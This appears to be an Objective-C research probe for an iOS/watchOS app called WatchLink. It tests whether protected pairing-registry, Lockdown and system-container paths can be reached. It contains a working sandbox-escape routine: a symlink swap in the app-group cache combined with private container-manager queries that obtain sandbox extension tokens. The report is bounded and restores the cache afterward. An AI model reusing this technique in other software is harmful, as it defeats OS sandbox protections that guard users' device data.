// Class-7 MCM access strategy adapted from Gester and HermesEnabler 2 (MIT).
// Original notices are retained in licenses/ and THIRD_PARTY_NOTICES.md.
#import "Probe.h"
#import <CoreFoundation/CoreFoundation.h>
#import <TargetConditionals.h>
#import <dlfcn.h>
#import <errno.h>
#import <fcntl.h>
#import <stdlib.h>
#import <sys/stat.h>
#import <unistd.h>
#import <dirent.h>
#import <mach/mach.h>
#import <objc/runtime.h>

#if TARGET_OS_IOS
NSString *DWCopyReport(NSString *text) {
    if (!NSThread.isMainThread) return @"Copy could not run on the main thread.";
    @try {
        UIPasteboard.generalPasteboard.string = text;
        return nil;
    } @catch (__unused NSException *exception) {
        return @"Clipboard access was denied. Use Share, Save, or select the report text.";
    }
}

UIViewController *DWMakeReportExporter(NSURL *fileURL) {
    if (!NSThread.isMainThread || !fileURL.isFileURL ||
        ![NSFileManager.defaultManager fileExistsAtPath:fileURL.path]) return nil;
    @try {
        return [[UIDocumentPickerViewController alloc] initForExportingURLs:@[fileURL] asCopy:YES];
    } @catch (__unused NSException *exception) { return nil; }
}

UIViewController *DWMakeReportSharer(NSURL *fileURL) {
    if (!NSThread.isMainThread || !fileURL.isFileURL ||
        ![NSFileManager.defaultManager fileExistsAtPath:fileURL.path]) return nil;
    @try {
        return [[UIActivityViewController alloc] initWithActivityItems:@[fileURL] applicationActivities:nil];
    } @catch (__unused NSException *exception) { return nil; }
}
#endif

static void *Resolve(void *library, const char *a, const char *b) {
    void *value = dlsym(library, a);
    return value ?: (b ? dlsym(library, b) : NULL);
}

static NSArray *OwnGroups(void) {
    void *security = dlopen("/System/Library/Frameworks/Security.framework/Security", RTLD_NOW);
    typedef CFTypeRef (*Create)(CFAllocatorRef);
    typedef CFTypeRef (*Copy)(CFTypeRef, CFStringRef, CFErrorRef *);
    Create create = (Create)Resolve(security ?: RTLD_DEFAULT, "SecTaskCreateFromSelf", NULL);
    Copy copy = (Copy)Resolve(security ?: RTLD_DEFAULT, "SecTaskCopyValueForEntitlement", NULL);
    NSMutableArray *groups = [NSMutableArray array];
    if (create && copy) {
        CFTypeRef task = create(kCFAllocatorDefault);
        if (task) {
            CFTypeRef value = copy(task, CFSTR("com.apple.security.application-groups"), NULL);
            if (value) {
                if (CFGetTypeID(value) == CFArrayGetTypeID())
                    for (id group in (__bridge NSArray *)value)
                        if ([group isKindOfClass:NSString.class] && [group hasSuffix:@".watchlink.probe"])
                            [groups addObject:group];
                CFRelease(value);
            }
            CFRelease(task);
        }
    }
    if (security) dlclose(security);
    return groups;
}

static NSDictionary *Inspect(NSString *path) {
    struct stat info;
    if (lstat(path.fileSystemRepresentation, &info) != 0)
        return @{@"metadata": @NO, @"open": @NO, @"errno": @(errno)};
    // Metadata/open check only. Bounded directory/container-metadata survey is reported separately.
    int descriptor = open(path.fileSystemRepresentation, O_RDONLY | O_CLOEXEC | O_NOFOLLOW);
    int error = descriptor < 0 ? errno : 0;
    if (descriptor >= 0) close(descriptor);
    return @{@"metadata": @YES, @"directory": @(S_ISDIR(info.st_mode)),
        @"symlink": @(S_ISLNK(info.st_mode)), @"open": @(descriptor >= 0), @"errno": @(error)};
}

// Bound enumeration and export counts/known component labels, never filenames or identifiers.
static NSDictionary *DirectorySurvey(NSString *path) {
    int fd = open(path.fileSystemRepresentation, O_RDONLY | O_DIRECTORY | O_CLOEXEC | O_NOFOLLOW);
    if (fd < 0) return @{ @"enumerated": @NO, @"errno": @(errno) };
    DIR *dir = fdopendir(fd);
    if (!dir) { int e=errno; close(fd); return @{ @"enumerated": @NO, @"errno": @(e) }; }
    NSUInteger seen=0, folders=0, files=0, metadataRead=0;
    NSMutableSet *components=[NSMutableSet set];
    NSMutableDictionary *stores=[NSMutableDictionary dictionary];
    NSArray *known=@[@"nanoregistry", @"networkrelay", @"identityservices", @"companion", @"rapport", @"pairedsync"];
    struct dirent *entry;
    BOOL capped=NO;
    while ((entry=readdir(dir))) {
        if (!strcmp(entry->d_name,".") || !strcmp(entry->d_name,"..")) continue;
        if (seen++ >= 64) { capped=YES; break; }
        struct stat st;
        if (fstatat(dirfd(dir),entry->d_name,&st,AT_SYMLINK_NOFOLLOW)) continue;
        if (S_ISREG(st.st_mode)) files++;
        if (!S_ISDIR(st.st_mode)) continue;
        folders++;
        int child=openat(dirfd(dir),entry->d_name,O_RDONLY|O_DIRECTORY|O_CLOEXEC|O_NOFOLLOW);
        if (child<0) continue;
        int meta=openat(child,".com.apple.mobile_container_manager.metadata.plist",O_RDONLY|O_CLOEXEC|O_NOFOLLOW);
        if (meta<0) { close(child); continue; }
        if (!fstat(meta,&st) && S_ISREG(st.st_mode) && st.st_size>0 && st.st_size<=32768) {
            NSMutableData *data=[NSMutableData dataWithLength:(NSUInteger)st.st_size];
            ssize_t count=read(meta,data.mutableBytes,data.length);
            if (count==(ssize_t)data.length) {
                id plist=[NSPropertyListSerialization propertyListWithData:data options:NSPropertyListImmutable format:NULL error:nil];
                if ([plist isKindOfClass:NSDictionary.class]) {
                    id identifier=plist[@"MCMMetadataIdentifier"];
                    if ([identifier isKindOfClass:NSString.class]) {
                        metadataRead++;
                        for (NSString *name in known)
                            if ([(NSString *)identifier rangeOfString:name options:NSCaseInsensitiveSearch].location!=NSNotFound) {
                                [components addObject:name];
                                NSMutableDictionary *locations=[NSMutableDictionary dictionary];
                                for (NSArray *location in @[@[@"registry",@"Library/DeviceRegistry"], @[@"state",@"Library/DeviceRegistry.state"], @[@"nanoRegistry",@"Library/NanoRegistry"], @[@"identityServices",@"Library/IdentityServices"]]) {
                                    struct stat storage;
                                    int rc=fstatat(child,[location[1] UTF8String],&storage,AT_SYMLINK_NOFOLLOW);
                                    int code=rc==0 ? 0 : errno;
                                    locations[location[0]]=@{@"metadata":@(rc==0),@"directory":@(rc==0 && S_ISDIR(storage.st_mode)),@"errno":@(code)};
                                }
                                if (!stores[name]) stores[name]=[NSMutableArray array];
                                [stores[name] addObject:locations];
                            }
                    }
                }
            }
        }
        close(meta);
        close(child);
    }
    closedir(dir);
    return @{ @"enumerated": @YES, @"entryLimit": @64, @"limitReached": @(capped),
              @"entriesVisited": @(MIN(seen,64)), @"directories": @(folders), @"regularFiles": @(files),
              @"containerMetadataRead": @(metadataRead), @"knownComponentStorage": stores, @"knownComponents": [[components allObjects] sortedArrayUsingSelector:@selector(compare:)] };
}

static NSArray *ServiceSurvey(void) {
    typedef int (*Lookup)(mach_port_t,const char *,mach_port_t *);
    Lookup lookup=(Lookup)dlsym(RTLD_DEFAULT,"bootstrap_look_up");
    mach_port_t *bootstrap=(mach_port_t *)dlsym(RTLD_DEFAULT,"bootstrap_port");
    NSMutableArray *results=[NSMutableArray array];
    for (NSString *name in @[@"com.apple.containermanagerd", @"com.apple.nanoregistryd", @"com.apple.networkrelay", @"com.apple.identityservicesd", @"com.apple.companiond", @"com.apple.mobile.lockdown"]) {
        mach_port_t port=MACH_PORT_NULL;
        int status=(lookup && bootstrap) ? lookup(*bootstrap,name.UTF8String,&port) : -1;
        BOOL acquired=status==0 && port!=MACH_PORT_NULL;
        if (port!=MACH_PORT_NULL) mach_port_deallocate(mach_task_self(),port);
        [results addObject:@{@"service":name,@"lookupAvailable":@(lookup && bootstrap),@"status":@(status),@"portAcquired":@(acquired),@"messagesSent":@NO}];
    }
    return results;
}

static NSDictionary *RegistryAPISurvey(void) {
    void *framework=dlopen("/System/Library/PrivateFrameworks/NanoRegistry.framework/NanoRegistry",RTLD_LAZY|RTLD_LOCAL);
    Class registry=objc_getClass("NRPairedDeviceRegistry");
    NSMutableDictionary *methods=[NSMutableDictionary dictionary];
    for (NSString *name in @[@"sharedInstance", @"getPairedDevices", @"getDevices", @"getActivePairedDevice"])
        methods[name]=@(registry && (class_getClassMethod(registry,NSSelectorFromString(name)) || class_getInstanceMethod(registry,NSSelectorFromString(name))));
    NSDictionary *result=@{@"frameworkLoaded":@(framework!=NULL),@"registryClassPresent":@(registry!=Nil),@"selectorsPresent":methods,@"methodsInvoked":@NO};
    // Keep an Objective-C framework loaded for process lifetime; unloading registered classes is unsafe.
    return result;
}

static BOOL Restore(NSString *cache, NSString *backup, NSString *journal, NSString **error) {
    NSFileManager *fm = NSFileManager.defaultManager;
    if (![fm fileExistsAtPath:journal]) return YES;
    NSDictionary *record = [NSDictionary dictionaryWithContentsOfFile:journal];
    NSString *target = record[@"target"];
    if (![target isKindOfClass:NSString.class] || !target.isAbsolutePath) {
        *error = @"Invalid recovery journal. Cache left untouched."; return NO;
    }
    struct stat info;
    if (lstat(cache.fileSystemRepresentation, &info) == 0) {
        if (!S_ISLNK(info.st_mode)) {
            // Crash between journal write and rename: recognize the exact original directory.
            if (![fm fileExistsAtPath:backup] && S_ISDIR(info.st_mode) &&
                [record[@"inode"] unsignedLongLongValue] == (unsigned long long)info.st_ino &&
                [record[@"device"] unsignedLongLongValue] == (unsigned long long)info.st_dev)
                return [fm removeItemAtPath:journal error:nil];
            *error = @"Cache differs from probe journal. Nothing replaced."; return NO;
        }
        NSString *destination = [fm destinationOfSymbolicLinkAtPath:cache error:nil];
        if (![destination isEqualToString:target] || unlink(cache.fileSystemRepresentation) != 0) {
            *error = @"Could not safely remove the probe link."; return NO;
        }
    }
    if ([fm fileExistsAtPath:backup]) {
        if (rename(backup.fileSystemRepresentation, cache.fileSystemRepresentation) != 0) {
            *error = @"Original cache could not be restored. Backup retained."; return NO;
        }
    } else if (![fm createDirectoryAtPath:cache withIntermediateDirectories:YES attributes:nil error:nil]) {
        *error = @"Could not restore empty cache directory."; return NO;
    }
    return [fm removeItemAtPath:journal error:nil];
}

static NSDictionary *ProtectedInspect(NSString *path, uint64_t queryFlags, NSString *strategy) {
    NSFileManager *fm = NSFileManager.defaultManager;
    NSArray *groups = OwnGroups();
    if (!groups.count) return @{@"attempted": @NO, @"reason": @"Signature needs a valid dedicated App Group ending .watchlink.probe."};
    NSURL *root = [fm containerURLForSecurityApplicationGroupIdentifier:groups.firstObject];
    if (!root) return @{@"attempted": @NO, @"reason": @"Dedicated group container unavailable."};
    NSString *library = [root.path stringByAppendingPathComponent:@"Library"];
    [fm createDirectoryAtPath:library withIntermediateDirectories:YES attributes:nil error:nil];
    NSString *cache = [library stringByAppendingPathComponent:@"Caches"];
    NSString *backup = [library stringByAppendingPathComponent:@"WatchLinkProbe.original"];
    NSString *journal = [library stringByAppendingPathComponent:@"WatchLinkProbe.journal.plist"];
    NSString *error;
    if (!Restore(cache, backup, journal, &error)) return @{@"attempted": @NO, @"reason": error ?: @"Recovery failed."};
    if ([fm fileExistsAtPath:backup]) return @{@"attempted": @NO, @"reason": @"Unexpected backup exists. Nothing replaced."};
    struct stat original = {0};
    BOOL hadCache = lstat(cache.fileSystemRepresentation, &original) == 0;
    if (hadCache && !S_ISDIR(original.st_mode)) return @{@"attempted": @NO, @"reason": @"Cache is not a directory."};
    void *mcm = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!mcm) return @{@"attempted": @NO, @"reason": @"MCM library unavailable."};
    typedef void *(*Create)(void);
    typedef void (*Number)(void *, uint64_t);
    typedef void (*Object)(void *, void *);
    typedef void *(*Get)(void *);
    typedef char *(*Token)(void *);
    typedef void (*Free)(void *);
    typedef int64_t (*Consume)(const char *);
    typedef int64_t (*Release)(int64_t);
    typedef void *(*String)(const char *);
    Create create = (Create)Resolve(mcm,"container_query_create",NULL);
    Number setClass = (Number)Resolve(mcm,"container_query_set_class",NULL);
    Object setGroup = (Object)Resolve(mcm,"container_query_set_group_identifiers",NULL);
    Number setPart = (Number)Resolve(mcm,"container_query_operation_set_part","container_query_set_part");
    Number setFlags = (Number)Resolve(mcm,"container_query_operation_set_flags","container_query_set_flags");
    Get get = (Get)Resolve(mcm,"container_query_get_single_result",NULL);
    Token token = (Token)Resolve(mcm,"container_copy_sandbox_token",NULL);
    Free freeQuery = (Free)Resolve(mcm,"container_query_free",NULL);
    Consume consume = (Consume)dlsym(RTLD_DEFAULT,"sandbox_extension_consume");
    Release release = (Release)dlsym(RTLD_DEFAULT,"sandbox_extension_release");
    String string = (String)dlsym(RTLD_DEFAULT,"xpc_string_create");
    Free freeString = (Free)dlsym(RTLD_DEFAULT,"xpc_release");
    if (!create || !setClass || !setGroup || !setPart || !setFlags || !get || !token ||
        !freeQuery || !consume || !release || !string || !freeString) {
        dlclose(mcm); return @{@"attempted": @NO, @"reason": @"Required API symbols unavailable."};
    }
    NSString *target = [path.pathExtension isEqualToString:@"plist"] ? path.stringByDeletingLastPathComponent : path;
    NSMutableDictionary *result = [@{@"attempted": @YES, @"extensionAcquired": @NO, @"strategy": strategy, @"queryFlags": [NSString stringWithFormat:@"0x%llx",(unsigned long long)queryFlags]} mutableCopy];
    BOOL journalCreated = NO;
    int64_t handle = -1;
    @try {
        journalCreated = [@{@"target": target, @"inode": @((unsigned long long)original.st_ino),
            @"device": @((unsigned long long)original.st_dev)} writeToFile:journal atomically:YES];
        if (!journalCreated) result[@"reason"] = @"Recovery journal could not be written.";
        else if (hadCache && rename(cache.fileSystemRepresentation, backup.fileSystemRepresentation) != 0) {
            [fm removeItemAtPath:journal error:nil]; journalCreated = NO;
            result[@"reason"] = @"Cache move denied.";
        } else if (symlink(target.fileSystemRepresentation, cache.fileSystemRepresentation) != 0)
            result[@"reason"] = @"Temporary link denied.";
        else {
            void *query = create();
            if (query) {
                void *identifier = string([groups.firstObject UTF8String]);
                if (identifier) {
                    setClass(query,7); setGroup(query,identifier); setPart(query,3); setFlags(query,queryFlags);
                    void *answer = get(query);
                    char *extension = answer ? token(answer) : NULL;
                    if (extension) { handle = consume(extension); free(extension); }
                    freeString(identifier);
                }
                freeQuery(query);
            }
            result[@"extensionAcquired"] = @(handle >= 0);
            result[@"extensionResult"] = @(handle);
            result[@"access"] = Inspect(path);
            result[@"directorySurvey"] = DirectorySurvey(path);
        }
    } @catch (__unused NSException *exception) {
        result[@"reason"] = @"MCM operation raised an exception.";
    } @finally {
        if (handle >= 0) release(handle);
        NSString *cleanupError;
        BOOL restored = !journalCreated || Restore(cache,backup,journal,&cleanupError);
        result[@"cacheRestored"] = @(restored);
        if (!restored) result[@"recoveryError"] = cleanupError ?: @"Recovery needed.";
        dlclose(mcm);
    }
    return result;
}

NSString *DWRunProbe(BOOL protectedAccess) {
    @autoreleasepool {
        NSArray *paths = @[
            @[@"Pairing registry directory", @"/private/var/mobile/Library/DeviceRegistry"],
            @[@"Pairing state directory", @"/private/var/mobile/Library/DeviceRegistry.state"],
            @[@"NanoRegistry directory candidate", @"/private/var/mobile/Library/NanoRegistry"],
            @[@"NanoRegistry preferences candidate", @"/private/var/mobile/Library/Preferences/com.apple.NanoRegistry.plist"],
            @[@"NetworkRelay preferences candidate", @"/private/var/mobile/Library/Preferences/com.apple.networkrelay.plist"],
            @[@"Lockdown records location candidate", @"/private/var/root/Library/Lockdown"],
            @[@"IdentityServices storage candidate", @"/private/var/mobile/Library/IdentityServices"],
            @[@"PairedSync storage candidate", @"/private/var/mobile/Library/PairedSync"],
            @[@"System data containers", @"/private/var/containers/Data/System"],
            @[@"System group containers", @"/private/var/containers/Shared/SystemGroup"],
            @[@"Internal daemon containers", @"/private/var/mobile/Containers/Data/InternalDaemon"],
            @[@"Mobile shared group containers", @"/private/var/mobile/Containers/Shared/AppGroup"]];
        NSMutableArray *checks = [NSMutableArray array];
        for (NSArray *candidate in paths) {
            NSString *path = candidate[1];
            NSMutableDictionary *check = [@{@"label": candidate[0], @"normalAccess": Inspect(path)} mutableCopy];
            check[@"normalDirectorySurvey"] = DirectorySurvey(path);
            if (protectedAccess) {
                NSMutableArray *attempts=[NSMutableArray array];
                NSArray *modes=@[@{@"name":@"legacy-mcm",@"flags":@(0x8100000000ULL)},
                                 @{@"name":@"worse-query-default",@"flags":@(0x8000000000ULL)},
                                 @{@"name":@"worse-query-alternate",@"flags":@(0x800000000ULL)}];
                for (NSDictionary *mode in modes) {
                    NSDictionary *attempt=ProtectedInspect(path,[mode[@"flags"] unsignedLongLongValue],mode[@"name"]);
                    [attempts addObject:@{@"strategy":mode[@"name"],@"result":attempt}];
                    if ([attempt[@"cacheRestored"] isEqual:@NO]) break;
                }
                check[@"protectedProbes"] = attempts;
                check[@"protectedProbe"] = [attempts.firstObject objectForKey:@"result"];
                check[@"afterLeaseReleased"] = Inspect(path);
            }
            [checks addObject:check];
        }
        NSDictionary *bundle = NSBundle.mainBundle.infoDictionary;
        NSDictionary *report = @{@"schema": @1, @"app": @"WatchLink", @"version": bundle[@"CFBundleShortVersionString"] ?: @"?",
            @"build": bundle[@"CFBundleVersion"] ?: @"?", @"platform": TARGET_OS_WATCH ? @"watchOS" : @"iOS",
            @"os": NSProcessInfo.processInfo.operatingSystemVersionString, @"uid": @(getuid()), @"euid": @(geteuid()),
            @"timestamp": @([[NSDate date] timeIntervalSince1970]), @"protectedProbeRequested": @(protectedAccess),
            @"checks": checks, @"researchSchema": @2, @"serviceSurvey": ServiceSurvey(), @"registryAPISurvey": RegistryAPISurvey(), @"watchOSQuerySupportVerified": @NO, @"containerIdentifiersExported": @NO, @"pairingChanged": @NO, @"keyMaterialRead": @NO, @"dualPairingImplemented": @NO,
            @"keyPreservationVerified": @NO, @"interpretation": @"File-open access does not prove keychain access, key preservation, protocol compatibility, or dual pairing."};
        NSData *json = [NSJSONSerialization dataWithJSONObject:report options:NSJSONWritingPrettyPrinted | NSJSONWritingSortedKeys error:nil];
        return json ? [[NSString alloc] initWithData:json encoding:NSUTF8StringEncoding] : @"Report serialization failed.";
    }
}
